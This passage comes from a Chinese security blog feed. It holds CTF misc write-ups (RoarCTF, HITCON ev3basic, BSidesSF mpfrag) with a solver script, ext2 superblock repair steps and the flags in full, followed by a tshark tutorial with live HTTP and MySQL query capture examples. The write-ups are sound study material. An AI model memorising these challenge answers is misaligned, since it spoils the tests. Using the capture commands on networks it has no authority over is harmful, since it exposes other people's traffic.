range(17):</span><br><span class="line">        text += str(data[i][j])</span><br><span class="line">text = list(text)</span><br><span class="line">def work(data,index,num):</span><br><span class="line">    if num == 3:</span><br><span class="line">        temp=&#x27;&#x27;.join(data)</span><br><span class="line">        if hashlib.sha1(&#x27;clearlove9&#x27;+temp).hexdigest() == &#x27;3f649f708aafa7a0a94138dc3022f6ea611e8d01&#x27;:</span><br><span class="line">            key=hashlib.md5(&#x27;clearlove9&#x27;+temp).hexdigest().upper()[:10]</span><br><span class="line">            flag=&quot;RoarCTF&#123;wm-&quot;+key+&quot;&#125;&quot;</span><br><span class="line">            print(flag)</span><br><span class="line">        return</span><br><span class="line">    if index == 21*17:</span><br><span class="line">        return</span><br><span class="line">    if data[index] ==&#x27;1&#x27;:</span><br><span class="line">        temp=list(data)</span><br><span class="line">        temp[index]=&#x27;8&#x27;</span><br><span class="line">        work(temp,index+1,num+1)</span><br><span class="line">    work(data,index+1,num)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    work(text,0,0)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RoarCTF&#123;wm-805CEC3545&#125;</span><br></pre></td></tr></table></figure><h2 id="HITCON2018-ev3basic"><a href="#HITCON2018-ev3basic" class="headerlink" title="[HITCON2018]ev3basic"></a>[HITCON2018]ev3basic</h2><p>得到一个流量包和一个图片，图片上是乐高EV3其中屏幕上显示hitcon{}直接搜特殊字符{得到如下结果</p><p><img src="/image/media/2022/ctf/buu/7/0.jpg"></p><p>再搜特殊字符}得到如下结果</p><p><img src="/image/media/2022/ctf/buu/7/1.jpg"></p><p>可以猜测flag位置大概在source是localhost()和destination是LEGOSyst_61:30:c1 (EV3)直接，但是长度可能会在28到34之间，然后对比{前面发现flag前缀不是hitcon于是就有可能flag顺序不对：hit_o_pcndo1}{1ncdomiekrfauai5nt_rnimmcmti_wreeavderom0_tn</p><p><img src="/image/media/2022/ctf/buu/7/2.jpg"></p><p>可以猜测从后往前数的第一个84，数据的倒数第五位为显示的字符，即图中7b，</p><p>字符显示在不同的行，因此数据需要指示行的位置，通过分析发现倒数第二个“84”前的数据表示行号，即图中00，</p><p>除了行以外，还要关注字符在这一行中的顺序，因为数据长度不同，从分析的结果看，表示方法也不同，总体上看是81前面的数字，即五角形标记出来的信息。12位为2个81之间的数字，11位为81前的数字。13位为81前，82后的数字。见下图</p><p><img src="/image/media/2022/ctf/buu/7/3.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hitcon&#123;m1nd5t0rm_communication_and_firmware_developer_kit&#125;</span><br></pre></td></tr></table></figure><h2 id="BSidesSF2020-mpfrag"><a href="#BSidesSF2020-mpfrag" class="headerlink" title="[BSidesSF2020]mpfrag"></a>[BSidesSF2020]mpfrag</h2><p>首先把后缀名修改成mp4，然后用KMPlayer播放，拿到字符串</p><p><img src="/image/media/2022/ctf/buu/7/23.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SF-G0lden-Gl0w-1849</span><br></pre></td></tr></table></figure><p>然后用file分析得到是ext2格式的文件系统镜像，尝试挂载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># file disk.bin              </span><br><span class="line">disk.bin: Linux rev 1.0 ext2 filesystem data, UUID=07a34ef3-2282-447d-b2fd-1ade0b320153 (large files)</span><br><span class="line"># mount disk.bin ./mnt</span><br><span class="line">mount: /root/Desktop/mnt: wrong fs type, bad option, bad superblock on /dev/loop0, missing codepage or helper program, or other error.</span><br></pre></td></tr></table></figure><p>报错，给出了可能的错误原因，其中包括 /dev/loop0的超级块损坏。文件系统中8193块存储有超级块的备份数据，用dd命令来提取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># dd if=disk.bin of=8193.bin bs=1024 skip=8193 count=1</span><br><span class="line">1+0 records in</span><br><span class="line">1+0 records out</span><br><span class="line">1024 bytes (1.0 kB, 1.0 KiB) copied, 0.000229264 s, 4.5 MB/s</span><br><span class="line">#注释</span><br><span class="line">if      infile，输入文件</span><br><span class="line">of      outfile，输出文件</span><br><span class="line">bs      bytes，设置输入/输出的块大小（以字节为单位）</span><br><span class="line">skip    blocks，从输入文件开头跳过多少个块后开始复制，此处8193是因为超级块备份数据在8193块</span><br><span class="line">count   只拷贝输入的blocks块</span><br><span class="line">记录了1+0 的读入，记录了1+0 的写出，1024 bytes (1.0 kB, 1.0 KiB) copied, 0.000229264 s, 4.5 MB/s</span><br></pre></td></tr></table></figure><p>然后把提取出来的备份块放回disk.bin的超级块位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># dd if=8193.bin of=disk.bin bs=1024 conv=notrunc seek=1</span><br><span class="line">1+0 records in</span><br><span class="line">1+0 records out</span><br><span class="line">1024 bytes (1.0 kB, 1.0 KiB) copied, 0.000216208 s, 4.7 MB/s</span><br><span class="line">#注释</span><br><span class="line">conv=notrunc    不截短输出文件</span><br><span class="line">seek=blocks     从输出文件开头跳过blocks个块后再开始复制</span><br><span class="line">记录了1+0 的读入，记录了1+0 的写出，1024 bytes (1.0 kB, 1.0 KiB) copied, 0.000216208 s, 4.7 MB/s</span><br></pre></td></tr></table></figure><p>然后再次挂载disk.bin，成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># mount disk.bin ./mnt</span><br></pre></td></tr></table></figure><p>然后去mnt文件夹查看到一堆图片和一个cloud.zip，用之前的字符串解压得到flag</p><p><img src="/image/media/2022/ctf/buu/7/24.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;bridge_ext2_gaps&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark命令行下的用法</title>
      <link href="/article/2022-04-01-Wireshark%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E7%9A%84%E7%94%A8%E6%B3%95/"/>
      <url>/article/2022-04-01-Wireshark%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E7%9A%84%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>Wireshark命令行下的用法。</p><span id="more"></span><h2 id="Wireshark命令行下的用法"><a href="#Wireshark命令行下的用法" class="headerlink" title="Wireshark命令行下的用法"></a>Wireshark命令行下的用法</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><p>可以访问到下面这链接里面，能够看到可以下载安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.wireshark.org/index.html#download</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/Wireshark/1.png"></p><p>在这里选择对应的版本系统即可，具体安装过程略，可以自行百度。</p><h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h3><p>安装完成之后可以在安装路径下面看到存在两个tshark.exe、Wireshark.exe</p><p><img src="/image/media/2022/Wireshark/2.png"></p><p>其中Wireshark.exe是图形化界面，tshark.exe是命令行界面</p><p>然后复制环境变量添加到用户变量和系统变量中，有可能需要重启才能生效</p><p><img src="/image/media/2022/Wireshark/3.png"></p><p>然后在cmd中能够输出执行这个命令<code>tshark.exe -h</code>并输出下面结果即可</p><p><img src="/image/media/2022/Wireshark/4.png"></p><h3 id="3-使用说明"><a href="#3-使用说明" class="headerlink" title="3.使用说明"></a>3.使用说明</h3><h4 id="3-1中文说明文档"><a href="#3-1中文说明文档" class="headerlink" title="3.1中文说明文档"></a>3.1中文说明文档</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">捕获接口:　　</span><br><span class="line">-i: -i &lt;interface&gt; 指定捕获接口，默认是第一个非本地循环接口;</span><br><span class="line">-f: -f &lt;capture filter&gt; 设置抓包过滤表达式，遵循libpcap过滤语法，这个实在抓包的过程中过滤，如果是分析本地文件则用不到。</span><br><span class="line">-s: -s &lt;snaplen&gt; 设置快照长度，用来读取完整的数据包，因为网络中传输有65535的限制，值0代表快照长度65535，默认也是这个值；　　</span><br><span class="line">-p: 以非混合模式工作，即只关心和本机有关的流量。　　</span><br><span class="line">-B: -B &lt;buffer size&gt; 设置缓冲区的大小，只对windows生效，默认是2M;　　</span><br><span class="line">-y: -y&lt;link type&gt; 设置抓包的数据链路层协议，不设置则默认为-L找到的第一个协议，局域网一般是EN10MB等;　　</span><br><span class="line">-D: 打印接口的列表并退出;　　</span><br><span class="line">-L 列出本机支持的数据链路层协议，供-y参数使用。</span><br><span class="line">捕获停止选项:　　</span><br><span class="line">-c: -c &lt;packet count&gt; 捕获n个包之后结束，默认捕获无限个;　　</span><br><span class="line">-a: -a &lt;autostop cond.&gt; ... duration:NUM，在num秒之后停止捕获;　　　　　　　　　　　　　　　　　　 </span><br><span class="line">filesize:NUM，在numKB之后停止捕获;　　　　　　　　　　　　　　　　　   </span><br><span class="line">files:NUM，在捕获num个文件之后停止捕获;</span><br><span class="line">捕获输出选项:　　</span><br><span class="line">-b &lt;ringbuffer opt.&gt; ... ring buffer的文件名由-w参数决定,-b参数采用test:value的形式书写;　　　　　　　　　　　　　　</span><br><span class="line"> duration:NUM - 在NUM秒之后切换到下一个文件;　　　　　　　　　　　　　　　　 </span><br><span class="line"> filesize:NUM - 在NUM KB之后切换到下一个文件;　　　　　　　　　　　　　　　　 </span><br><span class="line"> files:NUM - 形成环形缓冲，在NUM文件达到之后;</span><br><span class="line">RPCAP选项:　　</span><br><span class="line">remote packet capture protocol，远程抓包协议进行抓包；　　</span><br><span class="line">-A:  -A &lt;user&gt;:&lt;password&gt;,使用RPCAP密码进行认证;</span><br><span class="line"></span><br><span class="line">输入文件:　　</span><br><span class="line">-r: -r &lt;infile&gt; 设置读取本地文件</span><br><span class="line"></span><br><span class="line">处理选项:　　</span><br><span class="line">-2: 执行两次分析　　</span><br><span class="line">-R: -R &lt;read filter&gt;,包的读取过滤器，可以在wireshark的filter语法上查看；在wireshark的视图-&gt;过滤器视图，在这一栏点击表达式，就会列出来对所有协议的支持。</span><br><span class="line">-Y: -Y &lt;display filter&gt;,使用读取过滤器的语法，在单次分析中可以代替-R选项;　　</span><br><span class="line">-n: 禁止所有地址名字解析（默认为允许所有）　　</span><br><span class="line">-N: 启用某一层的地址名字解析。“m”代表MAC层，“n”代表网络层，“t”代表传输层，“C”代表当前异步DNS查找。如果-n和-N参数同时存在，-n将被忽略。如果-n和-N参数都不写，则默认打开所有地址名字解析。</span><br><span class="line">-d: 将指定的数据按有关协议解包输出,如要将tcp 8888端口的流量按http解包，应该写为“-d tcp.port==8888,http”;tshark -d. 可以列出所有支持的有效选择器。　　</span><br><span class="line">    </span><br><span class="line">输出选项:　　</span><br><span class="line">-w: -w &lt;outfile|-&gt; 设置raw数据的输出文件。这个参数不设置，tshark将会把解码结果输出到stdout,“-w -”表示把raw输出到stdout。如果要把解码结果输出到文件，使用重定向“&gt;”而不要-w参数。　　</span><br><span class="line">-F: -F &lt;output file type&gt;,设置输出的文件格式，默认是.pcapng,使用tshark -F可列出所有支持的输出文件类型。　　</span><br><span class="line">-V: 增加细节输出;　　</span><br><span class="line">-O: -O &lt;protocols&gt;,只显示此选项指定的协议的详细信息。　　</span><br><span class="line">-P: 即使将解码结果写入文件中，也打印包的概要信息；　　</span><br><span class="line">-S: -S &lt;separator&gt; 行分割符　　</span><br><span class="line">-x: 设置在解码输出结果中，每个packet后面以HEX dump的方式显示具体数据。　　</span><br><span class="line">-T: -T pdml|ps|text|fields|psml,设置解码结果输出的格式，包括text,ps,psml和pdml，默认为text　　</span><br><span class="line">-e: 如果-T fields选项指定，-e用来指定输出哪些字段;　　</span><br><span class="line">-E: -E &lt;fieldsoption&gt;=&lt;value&gt;如果-T fields选项指定，使用-E来设置一些属性，比如</span><br><span class="line">header=y|n　　　　</span><br><span class="line">separator=/t|/s|&lt;char&gt;　　　　</span><br><span class="line">occurrence=f|l|a　　　　</span><br><span class="line">aggregator=,|/s|&lt;char&gt;　　</span><br><span class="line">-t: -t a|ad|d|dd|e|r|u|ud 设置解码结果的时间格式。“ad”表示带日期的绝对时间，“a”表示不带日期的绝对时间，“r”表示从第一个包到现在的相对时间，“d”表示两个相邻包之间的增量时间（delta）。</span><br><span class="line">　　-u: s|hms 格式化输出秒；　　</span><br><span class="line">　　-l: 在输出每个包之后flush标准输出　　</span><br><span class="line">　　-q: 结合-z选项进行使用，来进行统计分析；　　</span><br><span class="line">　　-X: &lt;key&gt;:&lt;value&gt; 扩展项，lua_script、read_format，具体参见 man pages；　　</span><br><span class="line">　　-z：统计选项，具体的参考文档;tshark -z help,可以列出，-z选项支持的统计方式。　　</span><br><span class="line"></span><br><span class="line">其他选项:　　</span><br><span class="line">-h: 显示命令行帮助；　　</span><br><span class="line">-v: 显示tshark 的版本信息;</span><br></pre></td></tr></table></figure><h4 id="3-2英文说明文档"><a href="#3-2英文说明文档" class="headerlink" title="3.2英文说明文档"></a>3.2英文说明文档</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">TShark (Wireshark) 3.4.0 (v3.4.0-0-g9733f173ea5e)</span><br><span class="line">Dump and analyze network traffic.</span><br><span class="line">See https://www.wireshark.org for more information.</span><br><span class="line"></span><br><span class="line">Usage: tshark [options] ...</span><br><span class="line"></span><br><span class="line">Capture interface:</span><br><span class="line">  -i &lt;interface&gt;, --interface &lt;interface&gt;</span><br><span class="line">                           name or idx of interface (def: first non-loopback)</span><br><span class="line">  -f &lt;capture filter&gt;      packet filter in libpcap filter syntax</span><br><span class="line">  -s &lt;snaplen&gt;, --snapshot-length &lt;snaplen&gt;</span><br><span class="line">                           packet snapshot length (def: appropriate maximum)</span><br><span class="line">  -p, --no-promiscuous-mode</span><br><span class="line">                           don&#x27;t capture in promiscuous mode</span><br><span class="line">  -I, --monitor-mode       capture in monitor mode, if available</span><br><span class="line">  -B &lt;buffer size&gt;, --buffer-size &lt;buffer size&gt;</span><br><span class="line">                           size of kernel buffer (def: 2MB)</span><br><span class="line">  -y &lt;link type&gt;, --linktype &lt;link type&gt;</span><br><span class="line">                           link layer type (def: first appropriate)</span><br><span class="line">  --time-stamp-type &lt;type&gt; timestamp method for interface</span><br><span class="line">  -D, --list-interfaces    print list of interfaces and exit</span><br><span class="line">  -L, --list-data-link-types</span><br><span class="line">                           print list of link-layer types of iface and exit</span><br><span class="line">  --list-time-stamp-types  print list of timestamp types for iface and exit</span><br><span class="line"></span><br><span class="line">Capture stop conditions:</span><br><span class="line">  -c &lt;packet count&gt;        stop after n packets (def: infinite)</span><br><span class="line">  -a &lt;autostop cond.&gt; ..., --autostop &lt;autostop cond.&gt; ...</span><br><span class="line">                           duration:NUM - stop after NUM seconds</span><br><span class="line">                           filesize:NUM - stop this file after NUM KB</span><br><span class="line">                              files:NUM - stop after NUM files</span><br><span class="line">                            packets:NUM - stop after NUM packets</span><br><span class="line">Capture output:</span><br><span class="line">  -b &lt;ringbuffer opt.&gt; ..., --ring-buffer &lt;ringbuffer opt.&gt;</span><br><span class="line">                           duration:NUM - switch to next file after NUM secs</span><br><span class="line">                           filesize:NUM - switch to next file after NUM KB</span><br><span class="line">                              files:NUM - ringbuffer: replace after NUM files</span><br><span class="line">                            packets:NUM - switch to next file after NUM packets</span><br><span class="line">                           interval:NUM - switch to next file when the time is</span><br><span class="line">                                          an exact multiple of NUM secs</span><br><span class="line">RPCAP options:</span><br><span class="line">  -A &lt;user&gt;:&lt;password&gt;     use RPCAP password authentication</span><br><span class="line">Input file:</span><br><span class="line">  -r &lt;infile&gt;, --read-file &lt;infile&gt;</span><br><span class="line">                           set the filename to read from (or &#x27;-&#x27; for stdin)</span><br><span class="line"></span><br><span class="line">Processing:</span><br><span class="line">  -2                       perform a two-pass analysis</span><br><span class="line">  -M &lt;packet count&gt;        perform session auto reset</span><br><span class="line">  -R &lt;read filter&gt;, --read-filter &lt;read filter&gt;</span><br><span class="line">                           packet Read filter in Wireshark display filter syntax</span><br><span class="line">                           (requires -2)</span><br><span class="line">  -Y &lt;display filter&gt;, --display-filter &lt;display filter&gt;</span><br><span class="line">                           packet displaY filter in Wireshark display filter</span><br><span class="line">                           syntax</span><br><span class="line">  -n                       disable all name resolutions (def: all enabled)</span><br><span class="line">  -N &lt;name resolve flags&gt;  enable specific name resolution(s): &quot;mnNtdv&quot;</span><br><span class="line">  -d &lt;layer_type&gt;==&lt;selector&gt;,&lt;decode_as_protocol&gt; ...</span><br><span class="line">                           &quot;Decode As&quot;, see the man page for details</span><br><span class="line">                           Example: tcp.port==8888,http</span><br><span class="line">  -H &lt;hosts file&gt;          read a list of entries from a hosts file, which will</span><br><span class="line">                           then be written to a capture file. (Implies -W n)</span><br><span class="line">  --enable-protocol &lt;proto_name&gt;</span><br><span class="line">                           enable dissection of proto_name</span><br><span class="line">  --disable-protocol &lt;proto_name&gt;</span><br><span class="line">                           disable dissection of proto_name</span><br><span class="line">  --enable-heuristic &lt;short_name&gt;</span><br><span class="line">                           enable dissection of heuristic protocol</span><br><span class="line">  --disable-heuristic &lt;short_name&gt;</span><br><span class="line">                           disable dissection of heuristic protocol</span><br><span class="line">Output:</span><br><span class="line">  -w &lt;outfile|-&gt;           write packets to a pcapng-format file named &quot;outfile&quot;</span><br><span class="line">                           (or &#x27;-&#x27; for stdout)</span><br><span class="line">  --capture-comment &lt;comment&gt;</span><br><span class="line">                           set the capture file comment, if supported</span><br><span class="line">  -C &lt;config profile&gt;      start with specified configuration profile</span><br><span class="line">  -F &lt;output file type&gt;    set the output file type, default is pcapng</span><br><span class="line">                           an empty &quot;-F&quot; option will list the file types</span><br><span class="line">  -V                       add output of packet tree        (Packet Details)</span><br><span class="line">  -O &lt;protocols&gt;           Only show packet details of these protocols, comma</span><br><span class="line">                           separated</span><br><span class="line">  -P, --print              print packet summary even when writing to a file</span><br><span class="line">  -S &lt;separator&gt;           the line separator to print between packets</span><br><span class="line">  -x                       add output of hex and ASCII dump (Packet Bytes)</span><br><span class="line">  -T pdml|ps|psml|json|jsonraw|ek|tabs|text|fields|?</span><br><span class="line">                           format of text output (def: text)</span><br><span class="line">  -j &lt;protocolfilter&gt;      protocols layers filter if -T ek|pdml|json selected</span><br><span class="line">                           (e.g. &quot;ip ip.flags text&quot;, filter does not expand child</span><br><span class="line">                           nodes, unless child is specified also in the filter)</span><br><span class="line">  -J &lt;protocolfilter&gt;      top level protocol filter if -T ek|pdml|json selected</span><br><span class="line">                           (e.g. &quot;http tcp&quot;, filter which expands all child nodes)</span><br><span class="line">  -e &lt;field&gt;               field to print if -Tfields selected (e.g. tcp.port,</span><br><span class="line">                           _ws.col.Info)</span><br><span class="line">                           this option can be repeated to print multiple fields</span><br><span class="line">  -E&lt;fieldsoption&gt;=&lt;value&gt; set options for output when -Tfields selected:</span><br><span class="line">     bom=y|n               print a UTF-8 BOM</span><br><span class="line">     header=y|n            switch headers on and off</span><br><span class="line">     separator=/t|/s|&lt;char&gt; select tab, space, printable character as separator</span><br><span class="line">     occurrence=f|l|a      print first, last or all occurrences of each field</span><br><span class="line">     aggregator=,|/s|&lt;char&gt; select comma, space, printable character as</span><br><span class="line">                           aggregator</span><br><span class="line">     quote=d|s|n           select double, single, no quotes for values</span><br><span class="line">  -t a|ad|adoy|d|dd|e|r|u|ud|udoy</span><br><span class="line">                           output format of time stamps (def: r: rel. to first)</span><br><span class="line">  -u s|hms                 output format of seconds (def: s: seconds)</span><br><span class="line">  -l                       flush standard output after each packet</span><br><span class="line">  -q                       be more quiet on stdout (e.g. when using statistics)</span><br><span class="line">  -Q                       only log true errors to stderr (quieter than -q)</span><br><span class="line">  -g                       enable group read access on the output file(s)</span><br><span class="line">  -W n                     Save extra information in the file, if supported.</span><br><span class="line">                           n = write network address resolution information</span><br><span class="line">  -X &lt;key&gt;:&lt;value&gt;         eXtension options, see the man page for details</span><br><span class="line">  -U tap_name              PDUs export mode, see the man page for details</span><br><span class="line">  -z &lt;statistics&gt;          various statistics, see the man page for details</span><br><span class="line">  --export-objects &lt;protocol&gt;,&lt;destdir&gt;</span><br><span class="line">                           save exported objects for a protocol to a directory</span><br><span class="line">                           named &quot;destdir&quot;</span><br><span class="line">  --color                  color output text similarly to the Wireshark GUI,</span><br><span class="line">                           requires a terminal with 24-bit color support</span><br><span class="line">                           Also supplies color attributes to pdml and psml formats</span><br><span class="line">                           (Note that attributes are nonstandard)</span><br><span class="line">  --no-duplicate-keys      If -T json is specified, merge duplicate keys in an object</span><br><span class="line">                           into a single key with as value a json array containing all</span><br><span class="line">                           values</span><br><span class="line">  --elastic-mapping-filter &lt;protocols&gt; If -G elastic-mapping is specified, put only the</span><br><span class="line">                           specified protocols within the mapping file</span><br><span class="line"></span><br><span class="line">Miscellaneous:</span><br><span class="line">  -h, --help               display this help and exit</span><br><span class="line">  -v, --version            display version info and exit</span><br><span class="line">  -o &lt;name&gt;:&lt;value&gt; ...    override preference setting</span><br><span class="line">  -K &lt;keytab&gt;              keytab file to use for kerberos decryption</span><br><span class="line">  -G [report]              dump one of several available reports and exit</span><br><span class="line">                           default report=&quot;fields&quot;</span><br><span class="line">                           use &quot;-G help&quot; for more help</span><br></pre></td></tr></table></figure><h3 id="4-例子"><a href="#4-例子" class="headerlink" title="4.例子"></a>4.例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">//打印http协议流相关信息</span><br><span class="line">tshark -s 512 -i eth0 -n -f &#x27;tcp dst port 80&#x27; -R &#x27;http.host and http.request.uri&#x27; -T fields -e http.host -e http.request.uri -l | tr -d &#x27;\t&#x27;</span><br><span class="line">注释：</span><br><span class="line">-s: 只抓取前512字节；</span><br><span class="line">-i: 捕获eth0网卡；</span><br><span class="line">-n: 禁止网络对象名称解析;</span><br><span class="line">-f: 只捕获协议为tcp,目的端口为80;</span><br><span class="line">-R: 过滤出http.host和http.request.uri;</span><br><span class="line">-T,-e: 指的是打印这两个字段;</span><br><span class="line">-I: 输出到命令行界面; </span><br><span class="line"></span><br><span class="line">//实时打印当前mysql查询语句</span><br><span class="line">tshark -s 512 -i eth0 -n -f &#x27;tcp dst port 3306&#x27; -R &#x27;mysql.query&#x27; -T fields -e mysql.query</span><br><span class="line">注释:</span><br><span class="line">-R: 过滤出mysql的查询语句;</span><br><span class="line"></span><br><span class="line">//导出smpp协议header和value的例子</span><br><span class="line">tshark -r test.cap -R &#x27;(smpp.command_id==0x80000004) and (smpp.command_status==0x0)&#x27; -e smpp.message_id -e frame.time -T fields -E header=y &gt;test.txt</span><br><span class="line">注释:</span><br><span class="line">-r: 读取本地文件，可以先抓包存下来之后再进行分析;　　　　</span><br><span class="line">-R: smpp...可以在wireshark的过滤表达式里面找到，后面会详细介绍;　　　　</span><br><span class="line">-E: 